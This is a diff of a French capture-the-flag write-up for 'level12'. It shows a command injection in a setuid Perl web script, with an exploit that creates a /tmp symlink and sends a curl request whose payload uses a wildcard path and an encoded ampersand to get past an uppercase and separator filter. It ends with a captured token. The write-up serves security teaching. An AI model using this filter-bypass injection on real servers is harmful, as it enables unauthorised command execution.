@@ -39,7 +39,7 @@ n(t(param("x"), param("y")));
 -rwsr-sr-x+ 1 flag12  level12  464 Mar  5  2016 level12.pl
 ```
 
-Je me rend compte que ce programme est exécuté par défaut en tant qu'utilisateur 'flag12' grâce à la commande:
+Je me rend compte que ce programme est exécuté par défaut en tant qu'utilisateur `flag12` grâce à la commande:
 ```sh
 ps aux | grep flag12
 ```
@@ -53,15 +53,15 @@ string y
 ##### Fonctionnement:
 Ce programme est composé de deux fonctions aux utilitées douteuses:
  * La fonction \<t>:
-	1. Applique un filtre sur 'x' qui transforme les lettres minuscules en majuscules.
-	2. Applique un filtre sur 'x' qui enlève tout ce qu'il y a après un caractère de séparation.
-	3. Exécute une commande shell qui utilise la variable 'x' modifiée.
+	1. Applique un filtre sur `x` qui transforme les lettres minuscules en majuscules.
+	2. Applique un filtre sur `x` qui enlève tout ce qu'il y a après un caractère de séparation.
+	3. Exécute une commande shell qui utilise la variable `x` modifiée.
  * La fonction \<n> est inutile dans son fonctionnement.
 
 > Le programme tourne sur un serveur tcp par defaut
 
 ##### Conclusions:
-Ce programme a une faille dans la fonction \<t> plus précisement au moment d'exécuter la commande shell. \
+Ce programme a une faille dans la fonction \<t> plus précisement au moment d`exécuter la commande shell. \
 Nous pouvons insérer la commande que nous voulons dans celle-ci tant que nous respectons ces règles simples:
  - Utiliser uniquement des caractères majuscule.
  - Ne pas écrire de caractères de séparation.
@@ -77,7 +77,7 @@ ln -s /bin/getflag /tmp/GETFLAG
 curl '127.0.0.1:4646?x="$(/*/GETFLAG>%262)"'
 tail -n 1 /var/log/apache2/error.log
 ```
-> Notez l'utilisation du shellcode '%26' pour éviter que le caractère de '&' soit pris en compte dans le filtre de séparateurs.
+> Notez l'utilisation du shellcode `%26` pour éviter que le caractère de `&` soit pris en compte dans le filtre de séparateurs.
 
 
 **token :** g1qKMiRpXf53AWhDaU7FEkczr
